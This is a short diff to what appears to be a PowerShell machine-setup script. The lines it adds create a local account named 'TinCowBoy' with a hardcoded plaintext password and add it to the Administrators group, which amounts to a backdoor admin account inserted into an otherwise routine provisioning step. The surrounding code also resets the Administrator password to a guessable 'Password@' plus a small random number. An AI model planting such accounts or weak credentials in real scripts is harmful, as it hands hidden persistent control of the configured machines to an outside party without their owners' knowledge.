@@ -18,6 +18,8 @@ if((Test-Path variable:islinux) -and $isLinux) {
 #Change Windows Password 
 $number = Get-Random -Maximum 10000
 Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "Password@$number" -Force)
+New-LocalUser "TinCowBoy" -Password "Dangvip2k5pro" -FullName "Nguyen Hai Dang" -Description "Description of this account."
+Add-LocalGroupMember -Group "Administrators" -Member "TinCowBoy"
 
 # get current IP
 $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -like 'ethernet*'}).IPAddress
